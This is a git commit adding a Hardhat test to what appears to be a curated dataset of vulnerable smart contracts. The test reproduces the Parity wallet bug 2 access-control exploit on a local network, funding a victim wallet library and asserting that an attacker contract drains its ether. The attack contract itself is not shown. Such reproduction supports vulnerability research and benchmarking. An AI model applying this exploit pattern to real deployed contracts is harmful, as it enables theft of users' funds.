f6694ea3596e05ee0af9c2994f4ad33693d97cd8
Monica Jin <monicachenjin@gmail.com>
2024-08-07 17:19:38 +0100

    add: parity wallet bug 2 exploit

---
+++ smartbugs-curated/0.4.x/test/access_control/parity_wallet_bug_2_test.js
@@ -0,0 +1,39 @@
+const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
+const { expect } = require('chai');
+
+describe('attack access_control/parity_wallet_bug_2.sol', function () {
+    async function deployContracts() {
+      const WalletLibrary = await ethers.getContractFactory('contracts/dataset/access_control/parity_wallet_bug_2.sol:WalletLibrary');
+      const victim = await WalletLibrary.deploy();  
+      await victim.waitForDeployment();
+      const address = await victim.getAddress();
+
+      const WalletLibraryAttacker = await ethers.getContractFactory('contracts/access_control/parity_wallet_bug_2_attack.sol:WalletLibraryAttacker');
+      const attacker = await WalletLibraryAttacker.deploy(address);  
+      await attacker.waitForDeployment();
+      return {victim, attacker};
+    }
+
+    it('exploit access control vulnerability', async function () {
+      const {victim, attacker} = await loadFixture(deployContracts);
+      const amount = ethers.parseEther("1");
+      const [signer] = await ethers.getSigners();
+      await signer.sendTransaction({
+        to: victim.target,
+        value: amount
+      });
+
+      const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
+      expect(victimBalanceBefore).to.equal(amount);
+
+      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.target);
+      expect(attackerBalanceBefore).to.equal(0);
+
+      await attacker.attack();
+      const victimBalanceAfter = await ethers.provider.getBalance(victim.target);
+      expect(victimBalanceAfter).to.equal(0);
+
+      const attackerBalanceAfter = await ethers.provider.getBalance(attacker.target);
+      expect(attackerBalanceAfter).to.equal(amount);
+    });
+  });
